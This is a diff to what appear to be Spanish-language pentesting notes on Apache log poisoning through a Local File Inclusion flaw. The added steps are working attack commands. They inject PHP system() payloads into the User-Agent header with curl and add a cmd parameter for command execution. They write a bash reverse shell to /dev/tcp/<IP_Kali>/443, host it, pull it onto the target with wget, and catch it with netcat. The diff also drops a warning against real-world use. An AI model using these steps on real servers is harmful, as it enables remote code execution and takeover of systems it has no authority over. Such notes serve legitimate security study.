@@ -28,13 +28,17 @@ Combinado con una vulnerabilidad de **Local File Inclusion (LFI)**, puede llevar
     - Red Hat/CentOS → `btmp`
 - Esto puede requerir pruebas para ubicar los logs correctos.
 
-## Mirar logs en Apache
+## Mirar logs en Apache en WEB
 
 ```shell 
-❯ /var/log/apache2/access.log            # Archivo de logs en Apache por consola  
+# Archivo de logs en Apache por consola
+❯ /var/log/apache2/access.log            
 ```
 
 ```shell
+Paso 1:
+# Mirar los logs 
+# Se coloca donde se encuetra el LFI (Path Traversal)
 ❯ ?file=/var/log/apache2/access.log      # Mirar logs por web 
 
 
@@ -46,6 +50,7 @@ Notas:
 ```bash 
 # Hacer la solicitud a la web y mirar los logs del 'User-Agent' desde Kali 
 
+Paso 2:
 ❯ curl -s -X GET "http://localhost/test" -H "User-Agent: PROBANDO"
 	# H = Cabecera a modificar
 ```
@@ -53,27 +58,46 @@ Notas:
 ## Inyección de comandos 
 
 ```shell
-# Se puede inyectar comandos si es una página en PHP. La función 'system' debe de estar habilitada. Para saberlo usar el siguiente comando:
-
-❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php phpinfo(); ?>"   # Mirar el phpinfo en la web y filtrar por 'disable_functions' para verificar que no este la función 'system' ahí 
-
-
-Notas:
-	1. No hacerlo en un entorno real
-```
-
-```shell
+Paso 3:
 # Ejecutar un comando desde la cabecera 'User Agent'
 ❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system('whoami'); ?>"  
+
+NORA:
+	- A veces es necesario ejecutarlo dos veces para ver el output
 ```
 
 ```shell
-# Controlar la ejecución del comando
+Paso 4:
+# Controlar la ejecución del comando desde la web 
 ❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
 	# Escapar el $ para evitar conflictos 
 
 Notas:
-	1. index.php?filename=/var/log/apache2/access.log&cmd=whoami    # Colocar '&cmd=' para ejecutar comandos 
+	1. ?file=/var/log/apache2/access.log&cmd=whoami   <- IMPORTANTE
+	 # Colocar '&cmd=' para ejecutar comandos 
+```
+
+```bash 
+Paso 5:
+# Crear en Kali el archivo 'shell.php' con la revershell  
+
+<?php system("bash -c 'bash -i >& /dev/tcp/<IP_Kali>/443 0>&1'"); ?>
+
+
+# Compartir la revershell 
+❯ python3 -m http.server 80
+```
+
+```bash 
+Paso 6:
+# Desde la web subir el archivo con la Revershell 
+	?file=/var/log/apache2/access.log&cmd=wget http://IP_Kali/shell.php
+
+Paso 7: 
+# Ejecutar la revershell desde la web 
+	http://IP/shell.php 
+
+❯ rlwrap nc -nlvp 443   # Recibir la revershell en Kali
 ```
 
 ## Log Poisoning SSH
